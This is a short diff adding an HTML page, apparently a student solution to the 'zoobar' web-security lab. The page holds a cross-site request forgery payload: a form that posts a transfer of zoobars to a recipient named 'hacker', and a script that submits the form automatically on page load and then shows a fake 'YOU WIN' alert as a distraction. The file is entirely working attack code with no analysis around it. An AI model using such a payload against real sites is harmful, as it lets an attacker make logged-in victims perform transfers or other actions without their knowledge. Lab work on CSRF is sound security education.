@@ -1,0 +1,17 @@
+<form method="POST"
+      action="https://niss.com/transfer.php"
+      target="it"
+      id="transfer-form">
+
+    <!--  默认一个zoobar-->
+    <input name="zoobars" type="text" value="1" size="5">
+    <input name="recipient" type="text" value="hacker">
+    <input type="hidden" name="submission" value="Send">
+</form>
+
+<script type="text/javascript">
+    // 自动提交表单
+    form = document.getElementById("transfer-form");
+    form.submit();
+    alert("CONGRATULATION!!! YOU WIN")
+</script>
